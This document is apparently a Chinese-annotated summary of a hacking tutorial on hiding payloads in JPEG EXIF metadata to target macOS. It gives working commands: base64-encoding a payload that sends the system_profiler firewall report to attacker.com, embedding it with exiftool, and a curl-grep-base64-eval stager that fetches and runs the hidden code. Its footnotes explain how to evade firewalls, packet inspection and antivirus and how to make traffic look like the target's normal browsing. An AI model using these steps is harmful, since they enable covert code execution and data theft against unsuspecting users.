## How to Hide Payloads Inside Photo Metadata

### Why Embed Payloads into Images? [^1]

- Firewall Evasion
- Deep Packet Inspection Evasion
- Antivirus Evasion

### Tools to Be Familiar With [^2]

1. Download an Image

   ​	`wget https://img.wonderhowto.com/img/40/73/63692360022109/0/hacking-macos-hide-payloads-inside-photo-metadata.1280x600.jpg -O image.jpg`

   

2. Generate the Payload

   ​	`printf 'touch ~/Desktop/hacked' | base64 | tr -d '\n'` [^3]

   ​	`printf 'd=$(system_profiler SPFirewallDataType);curl -s --data "​$d" -X POST http://attacker.com/index.php' | base64 | tr -d '\n'` [^4]

   

3. Embed the Payload into the Image

   ​	`apt-get update && apt-get install exiftool -V`

   ​	`exiftool -all= image.jpg`

   ​	`exiftool -Certificate='dG91Y2ggfi9EZXNrdG9wL2hhY2tlZA==' image.jpg`

   ​	`exiftool image.jpg`

   

4. Upload the Image to a Website
   - Avoid EXIF Data Sanitization [^5]
   - Website Encryption
   - Web Traffic Irregularities [^6]

5. Generate the Stager

   `p=$(curl -s https://website.com/image.jpg | grep Cert -a | sed 's/<[^>]*>//g' | base64 -D);eval $p`



[原文](https://null-byte.wonderhowto.com/how-to/hacking-macos-hide-payloads-inside-photo-metadata-0196815/)

---

[^1]: 在大多数情况下，不需要将有效负载隐藏在图像文件中。然而，在高度安全的环境中，[每个域](https://youtu.be/uGN6NYFkrh4?t=200)都由防火墙软件记录，隐藏有效载荷的内容和来源可能是有益的
[^2]: **[curl](https://linux.die.net/man/1/curl)**，**[system_profiler](https://null-byte.wonderhowto.com/how-to/hacking-macos-perform-situational-awareness-attacks-part-1-using-system-profiler-arp-0186422/)**，**[exiftool](https://null-byte.wonderhowto.com/how-to/change-file-metadata-access-modification-date-0166024/)**，**[grep](https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-10-manipulating-text-0148539/)**和**[Bash](https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/#jump-step1)**脚本等工具

[^3]: `dG91Y2ggfi9EZXNrdG9wL2hhY2tlZA==`
[^4]: `ZD0kKHN5c3RlbV9wcm9maWxlciBTUEZpcmV3YWxsRGF0YVR5cGUpO2N1cmwgLXMgLS1kYXRhICIkZCIgLVggUE9TVCBodHRwOi8vYXR0YWNrZXIuY29tL2luZGV4LnBocA==`
[^5]: Twitter，Imgur和Instagram等许多热门网站在上传时会自动从图像中删除元数据，这主要是为了保护用户不会意外上传包含GPS坐标的照片，这些照片会让网络用户和网络欺诈者骚扰并找到这些用户。包含有效载荷的图像在上传到主流网站时将被擦除。候选网站必须先手动测试，首先上传图像，然后下载，并使用exiftool查看嵌入的有效载荷是否仍然完整
[^6]: 理想情况下，攻击中使用的网站将是目标定期访问的网站。例如，如果目标每天早上访问一个特定的新闻网站，那么访问该域对于监视网络流量的系统管理员来说似乎不会产生怀疑。另一方面，对外国网站或成人网站的异常GET请求可能会引发一些危险信号。在侦察阶段可以使用隐蔽数据包捕获来枚举这种信息。关键是尽可能使流量看起来与目标的Web行为一样普通